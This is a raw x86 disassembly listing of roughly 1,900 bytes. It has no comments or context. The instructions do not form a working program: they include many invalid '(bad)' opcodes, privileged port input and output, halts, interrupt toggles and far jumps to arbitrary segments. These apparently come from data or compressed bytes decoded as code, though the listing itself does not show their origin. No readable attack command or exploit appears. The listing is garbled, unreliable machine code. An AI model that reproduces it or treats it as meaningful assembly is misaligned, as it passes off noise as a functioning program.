  41a5ac:	xor    DWORD PTR [ebp-0x5b07e02e],esp
  41a5b2:	and    DWORD PTR [esi-0x3],eax
  41a5b5:	mov    cl,0x21
  41a5b7:	push   eax
  41a5b8:	adc    BYTE PTR [ebx-0x6bf98b0e],dl
  41a5be:	in     eax,0x70
  41a5c0:	xor    DWORD PTR [esi-0x471ec12f],esp
  41a5c6:	aaa    
  41a5c7:	and    BYTE PTR [ecx],dh
  41a5c9:	mov    ds:0xfe3534c7,al
  41a5ce:	mov    dh,0xcd
  41a5d0:	inc    eax
  41a5d1:	pop    ds
  41a5d2:	add    BYTE PTR [eax],al
  41a5d4:	fwait
  41a5d5:	(bad)  
  41a5d6:	jmp    0x1534:0xca214f45
  41a5dd:	ds mov edx,0xfd7f20cd
  41a5e3:	call   FWORD PTR [eax+0x4f45ea62]
  41a5e9:	and    al,0xca
  41a5eb:	xor    al,0xf5
  41a5ed:	cmp    eax,0xdf40cdba
  41a5f2:	cld    
  41a5f3:	(bad)  
  41a5f4:	fmul   DWORD PTR [eax]
  41a5f6:	out    0xea,eax
  41a5f8:	je     0x41a659
  41a5fa:	fiadd  WORD PTR [ebx]
  41a5fc:	xor    DWORD PTR [ecx],ecx
  41a5fe:	int3   
  41a5ff:	xor    eax,DWORD PTR [ebx-0x2f]
  41a602:	out    0xd0,al
  41a604:	xchg   ebp,eax
  41a605:	out    0xfa,eax
  41a607:	hlt    
  41a608:	pop    edi
  41a609:	sti    
  41a60a:	add    esp,eax
  41a60c:	imul   esp,edx,0x9
  41a60f:	repnz add BYTE PTR [ebp-0x4],bl
  41a613:	std    
  41a614:	in     eax,0x62
  41a616:	int    0xaf
  41a618:	in     eax,dx
  41a619:	(bad)  
  41a61a:	out    0xd8,al
  41a61c:	in     eax,dx
  41a61d:	push   ebx
  41a61e:	cmc    
  41a61f:	push   es
  41a620:	mov    DWORD PTR [esi-0x7],0xe640ecba
  41a627:	mov    eax,0xb2df77df
  41a62c:	out    0x4a,al
  41a62e:	fnstsw WORD PTR [edi-0x4404e23b]
  41a634:	lock or bl,ah
  41a637:	call   0x60e6:0x85ea20ec
  41a63e:	or     edi,esp
  41a640:	add    esi,DWORD PTR [ecx]
  41a642:	or     DWORD PTR [eax-0x73f6ecfd],ecx
  41a648:	add    eax,DWORD PTR [ebx+0x9]
  41a64b:	mov    edi,0xb0093f03
  41a650:	add    edx,edi
  41a652:	or     BYTE PTR [ebx+eax*1+0x449091e],bh
  41a659:	and    eax,0xa041609
  41a65e:	or     DWORD PTR [ebx],ebx
  41a660:	add    al,0xd0
  41a662:	or     BYTE PTR [ebx+0x4],al
  41a665:	dec    BYTE PTR [eax]
  41a667:	adc    al,0x4
  41a669:	fimul  WORD PTR [eax]
  41a66b:	cli    
  41a66c:	add    eax,DWORD PTR [edx]
  41a66e:	or     DWORD PTR [eax],eax
  41a670:	icebp  
  41a671:	xor    ah,BYTE PTR [edx]
  41a673:	add    BYTE PTR [edx+0x0],cl
  41a676:	sub    eax,0x32db003b
  41a67b:	ss add cl,bl
  41a67e:	xor    dh,BYTE PTR ds:0xeb350d00
  41a684:	inc    DWORD PTR [edi]
  41a686:	sub    eax,0x350f0034
  41a68b:	xor    al,0x0
  41a68d:	jmp    0xaa868c4
  41a692:	jecxz  0x41a671
  41a694:	jo     0x41a694
  41a696:	int3   
  41a697:	cli    
  41a698:	pop    esp
  41a699:	mov    esi,0xcf46dccb
  41a69e:	iret   
  41a69f:	cli    
  41a6a0:	pop    esp
  41a6a1:	add    esi,DWORD PTR ds:0x8d973e7
  41a6a7:	sbb    al,0x2d
  41a6a9:	jmp    0xb5a7848f
  41a6ae:	mov    ebp,0x8ecc71cf
  41a6b3:	das    
  41a6b4:	fs mov esi,0xaa5beb90
  41a6ba:	(bad)  
  41a6bb:	jecxz  0x41a727
  41a6bd:	mov    es,WORD PTR [esi+ebp*2-0x14797fae]
  41a6c4:	push   eax
  41a6c5:	test   BYTE PTR [eax-0x7e849d0c],al
  41a6cb:	outs   dx,BYTE PTR ds:[esi]
  41a6cc:	push   edx
  41a6cd:	nop
  41a6ce:	jle    0x41a6bb
  41a6d0:	push   eax
  41a6d1:	mov    WORD PTR [eax-0xc],fs
  41a6d4:	bound  edi,QWORD PTR [ebx+0x12]
  41a6d7:	sub    ah,BYTE PTR [ebp+eax*2+0x0]
  41a6db:	ins    DWORD PTR es:[edi],dx
  41a6dc:	fnsave [eax+0x55]
  41a6df:	sub    eax,0x505d66d8
  41a6e4:	fldenv [edx+0x5b]
  41a6e7:	inc    ebx
  41a6e8:	jmp    0x41a75b
  41a6ea:	add    BYTE PTR [eax],ch
  41a6ec:	sub    BYTE PTR [esp+ebx*2+0x1f],ah
  41a6f0:	push   0x616a555f
  41a6f5:	std    
  41a6f6:	push   edx
  41a6f7:	jno    0x41a772
  41a6f9:	bound  edx,QWORD PTR [ebx+0x2d]
  41a6fc:	ja     0x41a771
  41a6fe:	cmp    ah,BYTE PTR gs:0x57446421
  41a705:	bound  ebp,QWORD PTR [ebp+0x7]
  41a708:	pop    esi
  41a709:	bound  esp,QWORD PTR [eax]
  41a70b:	dec    esp
  41a70c:	pop    esp
  41a70d:	outs   dx,DWORD PTR ds:[esi]
  41a70e:	sub    edi,DWORD PTR gs:[ecx+0x6c]
  41a712:	jb     0x41a6f5
  41a714:	or     DWORD PTR [edi+0x69],ecx
  41a717:	fsubr  QWORD PTR [eax+0x50]
  41a71a:	gs cli 
  41a71c:	ja     0x41a780
  41a71e:	jb     0x41a748
  41a720:	sub    BYTE PTR [ebp+ebp*1-0x73],ah
  41a724:	jbe    0x41a788
  41a726:	jb     0x41a700
  41a728:	push   esi
  41a729:	data16 je 0x41a719
  41a72c:	push   esi
  41a72d:	bound  esi,QWORD PTR [edx+0x7e]
  41a730:	push   0x693d206f
  41a735:	sub    dl,BYTE PTR [ebp-0x15]
  41a738:	push   0x5ad8206f
  41a73d:	std    
  41a73e:	and    al,0x0
  41a740:	mov    ebx,0xa1654855
  41a745:	gs popaw 
  41a748:	mov    cl,0x5f
  41a74a:	std    
  41a74b:	push   edx
  41a74c:	mov    eax,ds:0xad53625d
  41a751:	jae    0x41a7c6
  41a753:	gs jmp 0x4356:0xb4642129
  41a75b:	push   esp
  41a75c:	sbb    BYTE PTR ds:0x77e46544,al
  41a762:	jne    0x41a7c9
  41a764:	xor    DWORD PTR [esi],ebx
  41a766:	ror    BYTE PTR [edi+0x31],1
  41a769:	shr    edx,cl
  41a76b:	jae    0x41a741
  41a76d:	xor    ch,BYTE PTR [edx]
  41a76f:	js     0x41a735
  41a771:	mov    ebx,0xc0945503
  41a776:	and    eax,DWORD PTR [eax+edx*4+0x36]
  41a77a:	jecxz  0x41a77b
  41a77c:	push   0x13
  41a77e:	loope  0x41a7e6
  41a780:	xchg   DWORD PTR [edx-0x43],eax
  41a783:	pop    esi
  41a784:	test   DWORD PTR [ecx],eax
  41a786:	add    al,0x51
  41a788:	pusha  
  41a789:	push   cs
  41a78a:	jmp    0x41a7ff
  41a78c:	xchg   esp,eax
  41a78d:	inc    edx
  41a78e:	fild   QWORD PTR [ebx+eax*4-0x3]
  41a792:	loop   0x41a807
  41a794:	adc    DWORD PTR [edi+0x507401],ebp
  41a79a:	call   0x45bd901
  41a79f:	daa    
  41a7a0:	xor    DWORD PTR [edx],eax
  41a7a2:	add    al,0x41
  41a7a4:	add    BYTE PTR [esi-0x5c],bh
  41a7a7:	(bad)  
  41a7a8:	push   ebx
  41a7a9:	arpl   WORD PTR [ecx+0x62654dcc],sp
  41a7af:	rcl    DWORD PTR [ecx+0x68],1
  41a7b2:	popf   
  41a7b3:	les    edx,FWORD PTR [ecx+0x8]
  41a7b6:	(bad)  
  41a7b7:	ror    BYTE PTR [ebp-0x8],1
  41a7ba:	nop
  41a7bb:	rol    BYTE PTR [edx+0x31],1
  41a7be:	lahf   
  41a7bf:	leave  
  41a7c0:	inc    edx
  41a7c1:	repnz mov dh,0x1
  41a7c4:	inc    esi
  41a7c5:	(bad)  
  41a7c6:	scas   eax,DWORD PTR es:[edi]
  41a7c7:	rol    BYTE PTR [esi-0x12],0x8b
  41a7cb:	add    DWORD PTR [eax],eax
  41a7cd:	or     eax,0x766e293
  41a7d2:	out    dx,eax
  41a7d3:	add    BYTE PTR [ebp-0x1d],ch
  41a7d6:	mov    dl,ah
  41a7d8:	data16 xlat BYTE PTR ds:[ebx]
  41a7da:	jp     0x41a7cc
  41a7dc:	jno    0x41a7ab
  41a7de:	or     bh,ah
  41a7e0:	repz div edi
  41a7e3:	pop    ecx
  41a7e4:	icebp  
  41a7e5:	(bad)  
  41a7e7:	dec    edx
  41a7e8:	fnstcw WORD PTR [ecx+ebp*8+0x8d3ef3a]
  41a7ef:	cmp    al,0xf5
  41a7f1:	shl    esi,cl
  41a7f3:	dec    esp
  41a7f4:	jecxz  0x41a791
  41a7f6:	out    0x15,al
  41a7f8:	repnz xchg ebp,ebx
  41a7fb:	xor    ebx,edi
  41a7fd:	push   ds
  41a7fe:	out    0x1a,al
  41a800:	hlt    
  41a801:	pop    eax
  41a802:	sbb    al,0xce
  41a804:	add    ebx,DWORD PTR [ecx+0xf41af5]
  41a80a:	dec    eax
  41a80b:	sbb    al,0xbe
  41a80d:	add    ecx,DWORD PTR [ecx-0x7e0c050b]
  41a813:	das    
  41a814:	into   
  41a815:	sub    BYTE PTR [ecx],dh
  41a817:	int    0x2d
  41a819:	jmp    0xdf3c8c73
  41a81e:	jp     0x41a7e8
  41a820:	into   
  41a821:	cmc    
  41a822:	inc    ebp
  41a823:	faddp  st(3),st
  41a825:	add    ebp,DWORD PTR [ebp-0x38]
  41a828:	mov    esi,0xbfde55f5
  41a82d:	out    dx,al
  41a82e:	dec    ebx
  41a82f:	or     DWORD PTR [ebx-0x3208b13c],esp
  41a835:	out    0x13,al
  41a837:	fld    st(2)
  41a839:	out    dx,al
  41a83a:	and    DWORD PTR [ecx],ecx
  41a83c:	call   0x20e2:0x9df514e8
  41a843:	out    0xba,al
  41a845:	les    edx,FWORD PTR [esi]
  41a847:	test   DWORD PTR [ebp+0x7ad913e6],0xb00901ee
  41a851:	jmp    0xe7c99d57
  41a856:	fcmove st,st(3)
  41a858:	jmp    FWORD PTR [ebx+ebx*2+0x748cfff9]
  41a85f:	stc    
  41a860:	ins    BYTE PTR es:[edi],dx
  41a861:	push   esp
  41a862:	dec    edx
  41a863:	imul   BYTE PTR [edx-0x17]
  41a866:	mov    bp,0x4a66
  41a86a:	push   ebp
  41a86b:	stc    
  41a86c:	ins    BYTE PTR es:[edi],dx
  41a86d:	cmp    al,0x0
  41a86f:	pop    esi
  41a870:	imul   ebx,DWORD PTR [ecx+0x2a],0x48
  41a874:	fisubr WORD PTR [ebp+eax*2+0x18]
  41a878:	imul   ebx,DWORD PTR [ecx+0x1b],0x18
  41a87c:	jmp    0xe973:0xdefe1c68
  41a883:	in     eax,0x1f
  41a885:	dec    ebx
  41a886:	add    al,0x19
  41a888:	call   0xcd6eaff9
  41a88d:	dec    eax
  41a88e:	mov    esp,0xc6be7f7
  41a893:	or     ch,bl
  41a895:	call   FWORD PTR [eax*1-0x25f09307]
  41a89c:	fisub  WORD PTR [edx-0x6]
  41a89f:	xor    al,dh
  41a8a1:	outs   dx,DWORD PTR ds:[esi]
  41a8a2:	ror    ch,1
  41a8a4:	push   0x59
  41a8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8a7:	ret    0x60e3
  41a8aa:	mov    ch,0x87
  41a8ac:	fisub  DWORD PTR [esi-0x36]
  41a8af:	xor    bl,al
  41a8b1:	jae    0x41a87b
  41a8b3:	shl    ah,1
  41a8b5:	sub    ah,BYTE PTR [edi-0x46004582]
  41a8bb:	fwait
  41a8bc:	mul    BYTE PTR [edx-0x46]
  41a8bf:	dec    eax
  41a8c0:	loop   0x41a92f
  41a8c2:	nop
  41a8c3:	xor    cl,ch
  41a8c5:	push   eax
  41a8c6:	nop
  41a8c7:	sahf   
  41a8c8:	out    0x70,eax
  41a8ca:	jmp    0x9aa87d2d
  41a8cf:	mov    ebp,ecx
  41a8d1:	ins    BYTE PTR es:[edi],dx
  41a8d2:	add    BYTE PTR [eax],al
  41a8d4:	popf   
  41a8d5:	es dec ecx
  41a8d7:	gs mov ah,0x5f
  41a8da:	pop    esi
  41a8db:	add    BYTE PTR [esi+0x68],ch
  41a8de:	jno    0x41a950
  41a8e0:	dec    eax
  41a8e1:	push   ebp
  41a8e2:	std    
  41a8e3:	fs dec eax
  41a8e5:	pop    edx
  41a8e6:	std    
  41a8e7:	jae    0x41a941
  41a8e9:	pop    ebp
  41a8ea:	std    
  41a8eb:	ins    DWORD PTR es:[edi],dx
  41a8ec:	pop    eax
  41a8ed:	dec    ebx
  41a8ee:	std    
  41a8ef:	jb     0x41a939
  41a8f1:	push   es
  41a8f2:	add    BYTE PTR [edi+eax*1+0x61],bl
  41a8f6:	ins    BYTE PTR es:[edi],dx
  41a8f7:	bound  edi,QWORD PTR [ecx+0x61]
  41a8fa:	sbb    eax,0x6b5a6f44
  41a8ff:	ins    BYTE PTR es:[edi],dx
  41a900:	pop    edi
  41a901:	fs popa 
  41a903:	cmp    al,BYTE PTR gs:0x64fe4d4f
  41a90a:	outs   dx,DWORD PTR ds:[esi]
  41a90b:	arpl   WORD PTR [eax],si
  41a90d:	add    eax,0x76357246
  41a912:	gs inc esi
  41a914:	adc    al,0x55
  41a916:	std    
  41a917:	sub    eax,0x43404b
  41a91c:	sbb    ah,BYTE PTR [ecx+0x5e]
  41a91f:	jp     0x41a956
  41a921:	stos   DWORD PTR es:[edi],eax
  41a922:	jno    0x41a994
  41a924:	enter  0x6676,0x74
  41a928:	cmc    
  41a929:	and    esp,DWORD PTR [ecx+eiz*2-0x1c]
  41a92d:	add    eax,0x59db614c
  41a932:	dec    ebp
  41a933:	popa   
  41a934:	jnp    0x41a9ac
  41a936:	je     0x41a9a7
  41a938:	add    dl,ch
  41a93a:	dec    ecx
  41a93b:	std    
  41a93c:	dec    ebx
  41a93d:	jns    0x41a9b5
  41a93f:	jno    0x41a982
  41a941:	je     0x41a98c
  41a943:	outs   dx,DWORD PTR ds:[esi]
  41a944:	gs mov ebx,0xb94bfd76
  41a94a:	jbe    0x41a9bd
  41a94c:	push   ebp
  41a94d:	xor    DWORD PTR [edi-0x73ce8e20],ecx
  41a953:	in     al,0x70
  41a955:	std    
  41a956:	(bad)  
  41a957:	out    0x71,al
  41a959:	in     eax,0x5f
  41a95b:	shr    BYTE PTR [edi+ecx*8-0x15],cl
  41a95f:	in     eax,dx
  41a960:	pop    esi
  41a961:	jecxz  0x41a8e7
  41a963:	aad    0x45
  41a965:	(bad)
  41a968:	addr16 loope 0x41a92f
  41a96b:	loop   0x41a9d5
  41a96d:	in     eax,0x1d
  41a96f:	call   0xbe0664d2
  41a974:	jae    0x41a937
  41a976:	and    edx,ecx
  41a978:	bound  esp,QWORD PTR [ebp-0x719214e2]
  41a97e:	and    eax,DWORD PTR [esp+ebx*2]
  41a981:	jae    0x41a9a9
  41a983:	jecxz  0x41a9fe
  41a985:	mov    WORD PTR [eax],?
  41a987:	lock outs dx,DWORD PTR ds:[esi]
  41a989:	xor    DWORD PTR [eax-0x25],ebx
  41a98c:	outs   dx,DWORD PTR ds:[esi]
  41a98d:	xchg   ebp,eax
  41a98e:	jb     0x41a94b
  41a990:	push   ebx
  41a991:	popa   
  41a992:	dec    ebx
  41a993:	sub    ch,BYTE PTR [esi]
  41a995:	gs stc 
  41a997:	in     eax,0x68
  41a999:	lea    esp,[ebx-0x17]
  41a99c:	bound  eax,QWORD PTR [eax]
  41a99e:	push   ebp
  41a99f:	push   cs
  41a9a0:	fsubr  DWORD PTR [ecx+eiz*2+0xd]
  41a9a4:	out    0x5b,al
  41a9a6:	push   edx
  41a9a7:	aas    
  41a9a8:	call   0xdd99fa17
  41a9ad:	jmp    FWORD PTR [edi+0x4f]
  41a9b0:	mov    ebx,0xc2726153
  41a9b5:	ins    BYTE PTR es:[edi],dx
  41a9b6:	inc    edi
  41a9b7:	inc    eax
  41a9b8:	loopne 0x41aa1a
  41a9ba:	and    eax,0x226de639
  41a9bf:	adc    al,dh
  41a9c1:	ja     0x41a9e8
  41a9c3:	jb     0x41a9f7
  41a9c5:	inc    esp
  41a9c6:	inc    esp
  41a9c7:	or     DWORD PTR [ebp-0x65f70131],ebp
  41a9cd:	in     al,dx
  41a9ce:	add    ch,dh
  41a9d0:	cdq    
  41a9d1:	and    eax,0x37ff716
  41a9d6:	aad    0x1b
  41a9d8:	stos   DWORD PTR es:[edi],eax
  41a9d9:	sub    bh,dh
  41a9db:	mov    esp,0xbc050396
  41a9e0:	jg     0x41a9d1
  41a9e2:	ror    esp,cl
  41a9e4:	xor    edx,0xffffffcf
  41a9e7:	out    dx,eax
  41a9e8:	push   esp
  41a9e9:	ffreep st(0)
  41a9eb:	or     BYTE PTR [edx],bh
  41a9ed:	(bad)
  41a9f0:	cmp    eax,0x2acde0c3
  41a9f5:	ror    edx,0xe9
  41a9f8:	cmp    ecx,esi
  41a9fa:	xchg   ebx,eax
  41a9fb:	fcomp  QWORD PTR [edx]
  41a9fd:	rcr    BYTE PTR [edi+0xc84bd9],1
  41aa03:	xchg   edi,eax
  41aa04:	jmp    0x41aa10
  41aa06:	stc    
  41aa07:	ins    BYTE PTR es:[edi],dx
  41aa08:	and    dl,bh
  41aa0a:	das    
  41aa0b:	inc    eax
  41aa0c:	int3   
  41aa0d:	fidivr WORD PTR [ebx]
  41aa0f:	pop    edx
  41aa10:	iret   
  41aa11:	fdivr  QWORD PTR [ebp+0x33d83640]
  41aa17:	inc    esi
  41aa18:	retf   0xc2d3
  41aa1b:	and    esp,ecx
  41aa1d:	mov    edi,0xb7212126
  41aa22:	xor    esp,DWORD PTR [ebx]
  41aa24:	retf   
  41aa25:	mov    eax,0xad2222bd
  41aa2a:	ror    DWORD PTR [ebx-0x3b],0x17
  41aa2e:	es add eax,ebp
  41aa31:	push   ss
  41aa32:	fadd   DWORD PTR [ebp-0xe]
  41aa35:	mov    esp,0xac090330
  41aa3a:	loop   0x41aa5d
  41aa3c:	loop   0x41a9e2
  41aa3e:	iret   
  41aa3f:	test   BYTE PTR [eax],0x0
  41aa42:	xchg   ebp,eax
  41aa43:	je     0x41aa2f
  41aa45:	jae    0x41a9e1
  41aa47:	xchg   ebx,eax
  41aa48:	fstp   DWORD PTR [esi-0x69]
  41aa4b:	ins    DWORD PTR es:[edi],dx
  41aa4c:	sub    esp,DWORD PTR [bx+di-0x89c]
  41aa51:	inc    esi
  41aa53:	sub    bl,0x6f
  41aa56:	jmp    0xb49374c1
  41aa5b:	cmp    DWORD PTR [ecx+0x918ce55],0xd8618870
  41aa65:	je     0x41aae5
  41aa67:	add    BYTE PTR [eax-0x15],ah
  41aa6a:	pop    ds
  41aa6b:	sbb    al,0x2
  41aa6d:	and    esp,DWORD PTR [edx+0x23]
  41aa70:	sub    eax,0x434c70dc
  41aa75:	cmc    
  41aa76:	pop    esi
  41aa77:	cmp    al,0x56
  41aa79:	and    DWORD PTR [ecx+0x3],esi
  41aa7c:	xor    eax,0x194d72ef
  41aa81:	pop    es
  41aa82:	pop    edi
  41aa83:	dec    ebp
  41aa84:	adc    ecx,ebx
  41aa86:	bound  edi,QWORD PTR [edx]
  41aa88:	and    BYTE PTR [ecx],ah
  41aa8a:	jno    0x41aa6f
  41aa8c:	xor    dh,BYTE PTR [edi]
  41aa8e:	add    BYTE PTR ds:0x3a4ab8c6,dh
  41aa94:	jecxz  0x41aa52
  41aa96:	sub    al,0xe9
  41aa98:	mov    ah,0xba
  41aa9a:	dec    edi
  41aa9b:	leave  
  41aa9c:	hlt    
  41aa9d:	cmc    
  41aa9e:	je     0x41aa89
  41aaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa1:	mov    edx,0xddd4274f
  41aaa6:	(bad)  
  41aaa7:	stc    
  41aaa8:	retf   
  41aaa9:	fisub  DWORD PTR [edx-0x26]
  41aaac:	adc    al,0xe1
  41aaae:	push   0xffffffcd
  41aab0:	xor    bh,BYTE PTR [eax-0x421150b4]
  41aab6:	ds mov ebx,0x51c277
  41aabc:	xchg   DWORD PTR [eax+0x6c],ebp
  41aabf:	sub    eax,0x204d56ce
  41aac4:	fwait
  41aac5:	sub    al,0x33
  41aac7:	pop    esp
  41aac8:	mov    ebx,0x696f69
  41aacd:	test   al,0x76
  41aacf:	jo     0x41aad1
  41aad1:	retf   
  41aad2:	dec    ebp
  41aad3:	inc    ebx
  41aad4:	push   esp
  41aad5:	mov    edi,0xc4454f4b
  41aada:	cmp    BYTE PTR [edx+eiz*2-0x39],ch
  41aade:	das    
  41aadf:	inc    esi
  41aae0:	push   esp
  41aae1:	enter  0x2f2a,0x2e
  41aae5:	lahf   
  41aae6:	ds inc ebx
  41aae8:	push   esp
  41aae9:	mov    eax,0xee726239
  41aaee:	outs   dx,DWORD PTR ds:[esi]
  41aaef:	outs   dx,DWORD PTR ds:[esi]
  41aaf0:	jae    0x41ab4a
  41aaf2:	push   eax
  41aaf3:	push   ecx
  41aaf4:	push   eax
  41aaf5:	sub    BYTE PTR [esi+0x6c],cl
  41aaf8:	jne    0x41aaf0
  41aafa:	pusha  
  41aafb:	std    
  41aafc:	inc    ebp
  41aafd:	dec    esp
  41aafe:	cmp    eax,0x6981461d
  41ab03:	bound  esp,QWORD PTR ds:0x61500d6c
  41ab09:	pop    ebx
  41ab0a:	pop    esi
  41ab0b:	je     0x41ab7c
  41ab0d:	sub    dh,BYTE PTR [ecx-0x3]
  41ab10:	push   edx
  41ab11:	sub    eax,0x1a65735f
  41ab16:	dec    ebx
  41ab17:	pop    esi
  41ab18:	ins    DWORD PTR es:[edi],dx
  41ab19:	sub    eax,0x3d73510d
  41ab1e:	pop    edi
  41ab1f:	inc    esi
  41ab20:	inc    esp
  41ab21:	fsub   DWORD PTR [ebx+ebp*2+0x5e44dc69]
  41ab28:	ins    BYTE PTR es:[edi],dx
  41ab29:	or     al,0x44
  41ab2b:	outs   dx,DWORD PTR ds:[esi]
  41ab2c:	gs sti 
  41ab2e:	pop    ebp
  41ab2f:	ins    BYTE PTR es:[edi],dx
  41ab30:	jb     0x41ab32
  41ab32:	ror    DWORD PTR [ecx],1
  41ab34:	push   eax
  41ab35:	outs   dx,DWORD PTR ds:[esi]
  41ab36:	xor    DWORD PTR [edx-0xb],eax
  41ab39:	dec    ebp
  41ab3a:	cmp    al,0xa5
  41ab3c:	jecxz  0x41aba0
  41ab3e:	and    esi,DWORD PTR [eax-0x2a]
  41ab41:	bound  esp,QWORD PTR [ebx]
  41ab43:	sahf   
  41ab44:	call   0xf1dab0ba
  41ab49:	bound  esi,QWORD PTR [ecx]
  41ab4b:	inc    eax
  41ab4c:	add    DWORD PTR [eax],eax
  41ab4e:	xor    DWORD PTR [ecx+ebx*8-0x1785cec2],ebp
  41ab55:	mov    ?,esp
  41ab57:	lock enter 0x464b,0xbe
  41ab5c:	dec    edx
  41ab5d:	add    eax,0xd1670791
  41ab62:	iret   
  41ab63:	mov    ah,0xcc
  41ab65:	jmp    DWORD PTR [eax]
  41ab67:	dec    esi
  41ab68:	cmp    BYTE PTR [esi],ch
  41ab6a:	and    ebx,DWORD PTR [ecx+0x7006311f]
  41ab70:	xor    DWORD PTR [edx],ecx
  41ab72:	das    
  41ab73:	pop    eax
  41ab74:	push   ds
  41ab75:	push   es
  41ab76:	xor    BYTE PTR [ebp+0x8],dh
  41ab79:	add    eax,0x51017332
  41ab7e:	sahf   
  41ab7f:	aam    0xf7
  41ab81:	je     0x41ab13
  41ab83:	and    bh,ah
  41ab85:	pop    ebx
  41ab86:	ins    DWORD PTR es:[edi],dx
  41ab87:	leave  
  41ab88:	loope  0x41abe8
  41ab8a:	mov    ds:0x6d4fd82c,al
  41ab8f:	pop    ds
  41ab90:	(bad)  [ebx-0x74]
  41ab93:	push   edx
  41ab94:	rcr    BYTE PTR [esi+0x0],0x8f
  41ab98:	adc    ecx,ebp
  41ab9a:	bound  eax,QWORD PTR [ebx+0x626cb972]
  41aba0:	add    WORD PTR [ebx+0x62],dx
  41aba4:	or     eax,0x116efff6
  41aba9:	cmc    
  41abaa:	jo     0x41abdd
  41abac:	add    ah,cl
  41abae:	jno    0x41abf5
  41abb0:	or     edi,esp
  41abb2:	aad    0x53
  41abb4:	test   ch,0xf7
  41abb7:	push   ebx
  41abb8:	sub    DWORD PTR [ebx-0x54f6bf24],ebp
  41abbe:	(bad)  
  41abbf:	daa    
  41abc0:	out    0xcb,eax
  41abc2:	cmc    
  41abc3:	adc    bl,dh
  41abc5:	leave  
  41abc6:	ficomp WORD PTR [esi+0x11f8cb36]
  41abcc:	lock out 0xf8,al
  41abcf:	add    esi,ebp
  41abd1:	cwde   
  41abd2:	and    DWORD PTR [eax],edx
  41abd4:	hlt    
  41abd5:	mov    ecx,gs
  41abd7:	pop    ss
  41abd8:	in     al,dx
  41abd9:	out    0x2f,al
  41abdb:	add    dh,ch
  41abdd:	xchg   edx,eax
  41abde:	not    edi
  41abe0:	repnz lea esp,[ebx]
  41abe3:	xlat   BYTE PTR ds:[ebx]
  41abe4:	jmp    0x275d9474
  41abe9:	out    0x25,eax
  41abeb:	xor    ebx,ebx
  41abed:	xchg   edi,ebx
  41abef:	ret    
  41abf0:	in     eax,dx
  41abf1:	and    esp,DWORD PTR [esi]
  41abf3:	xor    DWORD PTR [eax-0x243d15b3],edi
  41abf9:	inc    edi
  41abfa:	test   BYTE PTR [eax],0xd3
  41abfd:	les    edi,FWORD PTR [ecx]
  41abff:	fistp  DWORD PTR [ebx-0x7827ab0c]
  41ac05:	fisttp QWORD PTR [esi-0x1d]
  41ac08:	mov    eax,ebp
  41ac0a:	push   ss
  41ac0b:	test   DWORD PTR [edx+0x61d00fbd],0x8ff519ee
  41ac15:	hlt    
  41ac16:	or     al,0xf5
  41ac18:	dec    bl
  41ac1a:	add    eax,0x7d382f5
  41ac1f:	fist   WORD PTR [ebx+0x9]
  41ac22:	sbb    al,0xf5
  41ac24:	push   ebx
  41ac25:	xlat   BYTE PTR ds:[ebx]
  41ac26:	sub    al,0xe3
  41ac28:	dec    ebx
  41ac29:	out    dx,al
  41ac2a:	(bad)  
  41ac2b:	call   0xfab26f32
  41ac30:	leave  
  41ac31:	hlt    
  41ac32:	jno    0x41ac01
  41ac34:	xor    bh,BYTE PTR [ecx-0x2a392494]
  41ac3a:	jb     0x41ac00
  41ac3c:	int3   
  41ac3d:	out    0x71,al
  41ac3f:	jmp    0xd4b392ca
  41ac44:	mov    esi,ebp
  41ac46:	pop    esi
  41ac47:	int    0x86
  41ac49:	fisubr DWORD PTR [edi-0x34]
  41ac4c:	xor    dl,bl
  41ac4e:	outs   dx,DWORD PTR ds:[esi]
  41ac4f:	mov    ecx,0xd74fb778
  41ac54:	call   0x6cd5:0x6ee96bee
  41ac5b:	popf   
  41ac5c:	(bad)  
  41ac5d:	repz pop esi
  41ac5f:	test   DWORD PTR [eax],eax
  41ac61:	dec    ebp
  41ac62:	xor    al,BYTE PTR [eax]
  41ac64:	call   0xd953:0x7673ed51
  41ac6b:	bound  edx,QWORD PTR [ebp-0x789a0b93]
  41ac71:	push   edi
  41ac72:	out    0x40,al
  41ac74:	pop    esp
  41ac75:	cmp    eax,0x4b4e5103
  41ac7a:	xlat   BYTE PTR ds:[ebx]
  41ac7b:	je     0x41acc5
  41ac7d:	aas    
  41ac7e:	out    0xff,al
  41ac80:	es or  ebx,edx
  41ac83:	pop    ds
  41ac84:	dec    ebp
  41ac85:	push   cs
  41ac86:	fidiv  DWORD PTR [ebx+0x50]
  41ac89:	adc    eax,esp
  41ac8b:	jae    0x41accd
  41ac8d:	adc    ch,dh
  41ac8f:	pop    ds
  41ac90:	cmp    dl,BYTE PTR [esi]
  41ac92:	fnstenv [ebp+0xc]
  41ac95:	jmp    DWORD PTR [edx+0x43]
  41ac98:	xor    eax,0xc6402e5
  41ac9d:	cld    
  41ac9e:	(bad)  
  41ac9f:	call   bx
  41aca2:	(bad)  
  41aca3:	data16 add BYTE PTR [edi],bh
  41aca6:	addr16 sbb eax,0x6f6bdb75
  41acac:	add    BYTE PTR [esi],al
  41acae:	inc    ecx
  41acaf:	dec    ebp
  41acb0:	and    BYTE PTR [edx+ebp*2],dh
  41acb3:	jo     0x41ad29
  41acb5:	loope  0x41ad1f
  41acb7:	pop    esi
  41acb8:	je     0x41ac9b
  41acba:	imul   ebp,DWORD PTR [ebx+0x20],0x737067d8
  41acc1:	xchg   DWORD PTR [ecx+0x6f],ebp
  41acc4:	add    BYTE PTR fs:[eax+0x28505150],bl
  41accb:	jno    0x41ad2f
  41accd:	jae    0x41aca3
  41accf:	aas    
  41acd0:	imul   esp,DWORD PTR [ecx-0x3c],0x3f
  41acd4:	ins    BYTE PTR es:[edi],dx
  41acd5:	outs   dx,BYTE PTR ds:[esi]
  41acd6:	js     0x41ad2e
  41acd8:	ins    BYTE PTR es:[edi],dx
  41acd9:	jb     0x41ac7f
  41acdb:	push   es
  41acdc:	inc    esi
  41acdd:	push   esp
  41acde:	mov    eax,0xcb656426
  41ace3:	pop    edx
  41ace4:	data16 outs dx,BYTE PTR ds:[esi]
  41ace6:	mov    ecx,0xae6f665a
  41aceb:	es pop edi
  41aced:	popa   
  41acee:	aam    0x66
  41acf0:	imul   ebp,DWORD PTR [edi-0x49],0x8544606
  41acf7:	sub    eax,0x6aef7270
  41acfc:	data16 ins BYTE PTR es:[edi],dx
  41acfe:	in     eax,0x55
  41ad00:	std    
  41ad01:	inc    ebp
  41ad02:	fs cmp eax,0x69756850
  41ad08:	imul   eax,DWORD PTR [eax],0x736d6176
  41ad0e:	jo     0x41ad80
